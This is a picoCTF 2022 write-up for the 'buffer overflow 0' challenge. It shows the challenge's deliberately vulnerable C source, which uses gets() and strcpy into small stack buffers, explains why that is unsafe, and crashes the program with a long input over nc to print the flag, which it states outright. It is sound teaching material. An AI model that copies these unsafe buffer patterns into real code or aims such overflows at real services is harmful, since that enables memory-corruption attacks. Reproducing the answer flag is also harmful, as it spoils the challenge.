---
title: "picoCTF 2022: Binary Exploitation: buffer overflow 0"
seoDescription: "Smash the stack. Let's start off simple, can you overflow the correct buffer? The program is available here. You can view the source here. And connect..."
datePublished: Sat Oct 15 2022 10:26:45 GMT+0000 (Coordinated Universal Time)
cuid: cl99rxq9d001209me9g2ic7mh
slug: picoctf-2022-binary-exploitation-buffer-overflow-0
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1665829497838/cQfnMAzjk.png
tags: cyber-security, ctf, binary-exploitation, picoctf, picoctf-2022

---

## Introduction
**Challenge:** [buffer overflow 0](https://play.picoctf.org/practice/challenge/257?originalEvent=70&page=1)

**Category:** Binary Exploitation

**Description:**

Smash the stack.
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/521/vuln). You can view the source [here](https://artifacts.picoctf.net/c/521/vuln.c). And connect with it using:
```bash
nc saturn.picoctf.net 65355
```

## Solution
Here we've been provided with the binary executable and the source code. Let's take a look at the source code.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
The one thing that I noticed is that we are printing the flag on a segmentation fault, which is an error raised by memory-protected hardware whenever it tries to access a memory address that is either restricted or does not exist. If the flag `printf()` resides within `sigsegv_handler()`, then we can safely assume that we must figure out how to trigger a segmentation fault.
```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```
We see that on line 40, the horrible `gets()` is called, and reads buf1 (the user input) onto the stack. This function sucks, as it will write the user’s input to the stack without regard to its allocated length. The user can simply overflow this length, and the program will pass their input into the `vuln()` function to trigger a segmentation fault:
```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

gets(buf1); 
vuln(buf1);
```
Let's run the program and see if we get the flag if we did a segmentation fault:
```bash
nc saturn.picoctf.net 65355
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}
```
Yeah, we got the flag!

## Conclusion
Basically what we did was we did a buffer overflow. That means we have exceeded the size of a buffer.

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}`